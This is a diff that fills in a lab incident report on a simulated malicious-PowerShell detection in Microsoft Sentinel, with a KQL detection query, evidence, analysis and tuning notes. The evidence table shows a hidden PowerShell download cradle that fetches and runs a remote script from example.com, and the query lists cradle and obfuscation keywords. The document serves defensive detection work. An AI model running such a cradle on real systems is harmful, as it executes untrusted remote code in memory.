@@ -1,43 +1,86 @@
-# Incident 02: Malicious PowerShell Execution
+# Incident 02: Malicious PowerShell Execution (T1059.001)
 
 ## Summary
-*(fill in after execution — one-paragraph overview of what happened and outcome)*
+Sentinel detected a PowerShell process launched with common obfuscation/defense-evasion
+flags and a network download cradle, consistent with MITRE ATT&CK technique
+**T1059.001 - Command and Scripting Interpreter: PowerShell**.
 
-**MITRE ATT&CK:** T1059.001 — Command and Scripting Interpreter: PowerShell
-**Detection rule:** `detections/T1059.001-powershell.kql`
-**Severity:** *(TBD)*
-**Status:** *(TBD — Open / Contained / Resolved)*
-
-## Timeline
-| Time (UTC) | Event |
+## Incident Details
+| Field | Value |
 |---|---|
-| *TBD* | Atomic Red Team test executed against monitored VM |
-| *TBD* | Analytics rule triggered, incident created in Sentinel |
-| *TBD* | Analyst triage began |
-| *TBD* | Root cause confirmed |
-| *TBD* | Incident closed |
+| Incident ID | 28 |
+| Title | T1059.001 - Malicious PowerShell Execution |
+| Severity | Medium |
+| Status | Active |
+| Category | Execution |
+| MITRE ATT&CK | T1059, T1059.001 |
+| Detection source | Scheduled detection (Microsoft Sentinel) |
+| First activity | Sep 17, 2026, 4:34:45 AM |
+| Last activity | Sep 17, 2026, 4:38:12 AM |
+| Creation time | Sep 17, 2026, 5:22:38 AM |
+| Active alerts | 1/1 |
 
-## Detection Trigger
-*(fill in after execution — screenshot/description of the alert as it appeared in Sentinel's incident queue)*
+## Affected Asset
+- **Computer:** `vm-victim-01`
+- **Account:** `vm-victim-01\azureuser`
 
-![Analytics Rule Config](../screenshots/analytics-rule-config.png)
+## Detection Query
+```kql
+SecurityEvent
+| where EventID == 4688
+| where NewProcessName has_any ("powershell.exe", "pwsh.exe")
+| where CommandLine has_any (
+    "-enc", "-EncodedCommand", "-nop", "-noprofile",
+    "-w hidden", "-windowstyle hidden",
+    "IEX", "Invoke-Expression",
+    "DownloadString", "DownloadFile",
+    "-ExecutionPolicy Bypass"
+  )
+| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
+| order by TimeGenerated desc
+```
 
-## Investigation
-*(fill in after execution — command line captured, parent process, account context, whether execution succeeded or was blocked)*
+## Evidence
+Two matching events were captured within the incident window:
 
-## Indicators of Compromise (IOCs)
-| Type | Value |
-|---|---|
-| Process | *TBD* |
-| Command Line | *TBD* |
-| Parent Process | *TBD* |
-| Host | *TBD* |
+| TimeGenerated | Computer | Account | NewProcessName | CommandLine |
+|---|---|---|---|---|
+| Sep 17, 2026 4:34:45 AM | vm-victim-01 | vm-victim-01\azureuser | powershell.exe | `-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.ps1')"` |
+| Sep 17, 2026 4:38:12 AM | vm-victim-01 | vm-victim-01\azureuser | powershell.exe | `-nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://example.com/test.ps1')"` |
 
-## Root Cause
-*(fill in after execution)*
+**Parent process:** `powershell.exe` (both events) — self-spawned in this simulation
+rather than from a document/browser, since the attack was launched manually
+from an existing PowerShell session on the victim VM.
 
-## Remediation
-*(fill in after execution — process termination, account review, script block logging enabled, etc.)*
+**Key indicators present:**
+- `-nop` (NoProfile) — skips loading the PowerShell profile to reduce noise/logging
+- `-w hidden` (WindowStyle Hidden) — suppresses the console window
+- `IEX` (Invoke-Expression) combined with `DownloadString` — a classic
+  "download cradle" pattern used to fetch and execute remote payloads in memory
+  without writing a file to disk
 
-## Lessons Learned
-*(fill in after execution)*
+## Analysis
+This pattern is a textbook fileless-execution technique: rather than downloading
+a script to disk (which AV/EDR could scan), the payload is retrieved via
+`Net.WebClient` and piped directly into `Invoke-Expression`, executing it purely
+in memory under the hidden PowerShell process. The combination of `-nop`, `-w hidden`,
+and the download cradle together are strong, low-false-positive indicators of
+malicious intent rather than routine administration.
+
+## Response Actions
+1. Isolated finding to the lab VM `vm-victim-01` (simulated environment — no real
+   lateral spread).
+2. Confirmed `azureuser` was the executing account (matches expected simulation user).
+3. Documented command line and process lineage for the detection engineering record.
+4. Noted command-line auditing (`ProcessCreationIncludeCmdLine_Enabled`) was required
+   to be enabled on the host for the `CommandLine` field to populate — without it,
+   Event 4688 fires but with a blank command line, making this detection ineffective.
+
+## Lessons Learned / Tuning Notes
+- Command-line flags list is a starting set of common obfuscation/LOLBin indicators;
+  expand as further testing reveals additional patterns.
+- Requires command-line auditing enabled via registry (see `README.md` / lessons
+  learned) — verify this is enabled on any new host before relying on this detection.
+- Consider correlating `ParentProcessName` to flag PowerShell spawned from Office
+  apps or browsers as higher-severity — not applicable in this simulation since
+  the parent was PowerShell itself, but relevant for real-world tuning.
